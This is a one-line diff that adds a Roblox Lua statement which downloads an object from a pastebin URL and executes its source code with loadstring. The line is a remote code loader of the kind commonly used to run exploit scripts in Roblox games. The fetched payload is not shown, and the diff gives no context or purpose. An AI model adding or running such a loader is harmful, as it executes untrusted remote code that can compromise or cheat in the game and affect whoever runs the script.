@@ -1,0 +1,1 @@
+loadstring(game:GetObjects("https://pastebin.com/dE7RHqqT")[1].Source)()
